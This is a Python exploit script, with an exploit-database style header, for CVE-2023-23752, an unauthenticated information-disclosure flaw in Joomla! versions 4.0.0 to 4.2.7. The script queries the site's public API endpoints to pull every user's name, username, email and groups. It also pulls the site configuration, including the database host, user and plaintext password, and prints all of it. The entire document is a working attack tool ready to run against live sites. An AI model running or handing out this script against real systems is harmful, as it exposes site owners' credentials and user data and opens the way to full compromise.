#!/usr/bin/env python3

# Exploit
## Title: Joomla! v4.2.8 - Unauthenticated information disclosure
## Exploit author: noraj (Alexandre ZANNI) for ACCEIS (https://www.acceis.fr)
## Author website: https://pwn.by/noraj/
## Exploit source: https://github.com/Acceis/exploit-CVE-2023-23752
## Date: 2023-03-24
## Vendor Homepage: https://www.joomla.org/
## Software Link: https://downloads.joomla.org/cms/joomla4/4-2-7/Joomla_4-2-7-Stable-Full_Package.tar.gz?format=gz
## Version: 4.0.0 < 4.2.8 (it means from 4.0.0 up to 4.2.7)
## Tested on: Joomla! Version 4.2.7
## CVE : CVE-2023-23752
## References:
##   - https://nsfocusglobal.com/joomla-unauthorized-access-vulnerability-cve-2023-23752-notice/
##   - https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html
##   - https://attackerkb.com/topics/18qrh3PXIX/cve-2023-23752
##   - https://nvd.nist.gov/vuln/detail/CVE-2023-23752
##   - https://vulncheck.com/blog/joomla-for-rce
##   - https://github.com/projectdiscovery/nuclei-templates/blob/main/cves/2023/CVE-2023-23752.yaml

import json
import requests
import argparse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def fetch_users(root_url):
    vuln_urls = [
        f"{root_url}api/index.php/v1/users?public=true",
        f"{root_url}api/v1/users?public=true"
    ]
    for vuln_url in vuln_urls:
        try:
            response = requests.get(vuln_url, verify=False)
            response.raise_for_status()
            return response.json()
        except requests.exceptions.RequestException as e:
            print(f"HTTP request error at {vuln_url}: {e}")
        except json.JSONDecodeError as e:
            print(f"JSON decode error at {vuln_url}: {e}")
    return None

def parse_users(root_url):
    data_json = fetch_users(root_url)
    if data_json is None:
        return []
    data = data_json.get('data', [])
    users = []
    for user in data:
        if user['type'] == 'users':
            id = user['attributes']['id']
            name = user['attributes']['name']
            username = user['attributes']['username']
            email = user['attributes']['email']
            groups = user['attributes']['group_names']
            users.append({'id': id, 'name': name, 'username': username, 'email': email, 'groups': groups})
    return users

def display_users(root_url):
    users = parse_users(root_url)
    if not users:
        print("No users found ")
        return
    print('Users')
    for u in users:
        print(f"[{u['id']}] {u['name']} ({u['username']}) - {u['email']} - {u['groups']}")

def fetch_config(root_url):
    vuln_url = f"{root_url}api/index.php/v1/config/application?public=true"
    try:
        response = requests.get(vuln_url, verify=False)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"HTTP request error: {e}")
        return None
    except json.JSONDecodeError as e:
        print(f"JSON decode error: {e}")
        return None

def parse_config(root_url):
    data_json = fetch_config(root_url)
    if data_json is None:
        return {}
    data = data_json.get('data', [])
    config = {}
    for entry in data:
        if entry['type'] == 'application':
            key = list(entry['attributes'].keys())[0]
            config[key] = entry['attributes'][key]
    return config

def display_config(root_url):
    c = parse_config(root_url)
    if not c:
        print("No configuration found ")
        return
    print('Site info')
    print(f"Site name: {c.get('sitename', 'N/A')}")
    print(f"Site Editor: {c.get('editor', 'N/A')}")
    print(f"Site Captcha: {c.get('captcha', 'N/A')}")
    print(f"Site Access: {c.get('access', 'N/A')}")
    print(f"Site Debug status: {c.get('debug', 'N/A')}")
    print()
    print('DB info')
    print(f"DB type: {c.get('dbtype', 'N/A')}")
    print(f"DB host: {c.get('host', 'N/A')}")
    print(f"DB user: {c.get('user', 'N/A')}")
    print(f"DB password: {c.get('password', 'N/A')}")
    print(f"DB name: {c.get('db', 'N/A')}")
    print(f"DB prefix: {c.get('dbprefix', 'N/A')}")
    print(f"DB encryption: {c.get('dbencryption', 'N/A')}")

def main():
    parser = argparse.ArgumentParser(description='Joomla! < 4.2.8 - Unauthenticated information disclosure')
    parser.add_argument('url', help='Root URL (base path) including HTTP scheme, port and root folder')
    parser.add_argument('--debug', action='store_true', help='Display arguments')
    parser.add_argument('--no-color', action='store_true', help='Disable colorized output')
    args = parser.parse_args()

    if args.debug:
        print(args)

    display_users(args.url)
    print()
    display_config(args.url)

if __name__ == "__main__":
    main()
